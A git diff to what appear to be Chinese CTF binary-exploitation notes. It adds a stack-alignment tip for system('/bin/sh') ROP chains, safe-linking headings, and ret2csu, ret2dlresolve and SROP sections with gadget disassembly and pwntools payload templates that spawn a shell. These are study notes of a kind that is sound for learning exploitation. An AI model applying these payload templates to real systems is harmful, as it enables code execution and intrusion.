@@ -79,6 +79,14 @@ https://youtu.be/_ZnnGZygnzE?t=4522
 
 
 
+再顺便提一下`system("/bin/sh")`时卡在`<do_system+1099> movaps xmmword ptr [rsp + 0x40], xmmo`
+
+原因是没有满足栈平衡
+
+解决方法是ROPchain中加一个`ret`
+
+
+
 ## 0x05 pwndbg中查看状态寄存器
 
 ```bash
@@ -127,7 +135,7 @@ crontab常用命令
 
 ## 0x09 safe-linking加解密与bypass
 
-###加密
+**1、加密**
 
 ![image-20220930000628640](/assets/img/2022/image-20220930000628640.png)
 
@@ -147,7 +155,7 @@ crontab常用命令
 
 
 
-###解密
+**2、解密**
 
 众所周知，异或操作是可逆的
 
@@ -161,7 +169,7 @@ crontab常用命令
 
 
 
-###解密的关键
+**3、解密的关键**
 
 所以说leak出 `L>>12` 是关键
 
@@ -182,7 +190,7 @@ crontab常用命令
 
 
 
-### 利用
+**4、利用**
 
 把伪造的fd 和 KEY 异或一下，填入就可以
 
@@ -394,4 +402,121 @@ e.g.
 
 
 
- 
+## 0x21 ROP trick：ret2csu
+
+ret2csu中有两个比较好用的gadget片段
+
+```assembly
+.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54j
+.text:0000000000400600                 mov     rdx, r13
+.text:0000000000400603                 mov     rsi, r14
+.text:0000000000400606                 mov     edi, r15d
+.text:0000000000400609                 call    qword ptr [r12+rbx*8]
+.text:000000000040060D                 add     rbx, 1
+.text:0000000000400611                 cmp     rbx, rbp
+.text:0000000000400614                 jnz     short loc_400600
+.text:0000000000400616
+.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34j
+.text:0000000000400616                 add     rsp, 8
+.text:000000000040061A                 pop     rbx
+.text:000000000040061B                 pop     rbp
+.text:000000000040061C                 pop     r12
+.text:000000000040061E                 pop     r13
+.text:0000000000400620                 pop     r14
+.text:0000000000400622                 pop     r15
+.text:0000000000400624                 retn
+.text:0000000000400624 __libc_csu_init endp
+```
+
+`loc_400600`可以控制edi，rsi，rdx，然后call target funciton
+
+`loc_400616`可以控制一些寄存器
+
+payload:
+
+```py
+csu_front_addr = 0x400600 # mov rdx, r13;
+csu_end_addr = 0x40061A # pop rbx;
+
+#根据glibc的版本不同参数的位置也要进行相应的调整
+def csu(rbx, rbp, r12, r13, r14, r15):
+    # pop rbx,rbp,r12,r13,r14,r15
+    # rbx should be 0,
+    # rbp should be 1,enable not to jump
+    # r12 should be the function we want to call
+    # rdi=edi=r15d
+    # rsi=r14
+    # rdx=r13
+    payload = p64(csu_end_addr)
+    payload += p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
+    payload += p64(csu_front_addr)
+    payload += 'a' * 0x38
+    return payload # payload后面可以再接任意返回地址，接着ROP
+```
+
+
+
+## 0x22 ROP trick: ret2dlresolve
+
+原理：
+
+- [https://ray-cp.github.io/archivers/ret2dl_resolve_analysis](https://ray-cp.github.io/archivers/ret2dl_resolve_analysis)
+
+- [https://www.slideshare.net/AngelBoy1/re2dlresolve](https://www.slideshare.net/AngelBoy1/re2dlresolve)
+
+工具：
+
+- https://github.com/Gallopsled/pwntools/blob/dev/pwnlib/rop/ret2dlresolve.py
+
+利用：
+
+- [https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation](https://ir0nstone.gitbook.io/notes/types/stack/ret2dlresolve/exploitation)
+
+```python
+# create the dlresolve object
+dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=['/bin/sh'])
+
+rop.raw('A' * 76)  # padding to return address
+rop.read(0, dlresolve.data_addr)             # read to where we want to write the fake structures
+rop.ret2dlresolve(dlresolve)                 # call .plt and dl-resolve() with the correct, calculated reloc_offset
+
+p.sendline(rop.chain())
+p.sendline(dlresolve.payload)                # now the read is called and we pass all the relevant structures in
+```
+
+## 0x23 ROP trick: SROP
+
+- [https://www.anquanke.com/post/id/217081](https://www.anquanke.com/post/id/217081)
+
+**从程序流程看**，发生中断时，程序从用户态进入内核态，栈上压入`signal frame`和`sigreturn address`。从内核态返回时，执行`sigreturn syscall`
+
+```
+sigreturn
+x86：
+	mov eax, 0x77
+	int 0x80
+	
+x64:
+	mov rax, 0xf
+	syscall
+```
+
+**从利用角度看**，在栈上伪造sigreturn，如其名Sigreturn Oriented Programming
+
+payload：
+
+```python
+frame = SigreturnFrame()
+frame.rax = 0x3b # execve
+frame.rdi = bin_sh_addr
+frame.rip = syscall_ret
+
+payload = 'a'*0x10 # padding to return address
+payload += p64(mov_rax_0xf) + p64(syscall_ret) + flat(frame)
+```
+
+- 必须确保**syscall** sigreturn时，rsp指向sigreturn frame的首地址
+- 有些情况是**call** sigreturn，因为会向栈中压入一个返回地址，所以整体会移动8字节，则构造的fake sigreturn frame从第8字节开始写`str(frame)[8:]`就可以解决了
+
+
+
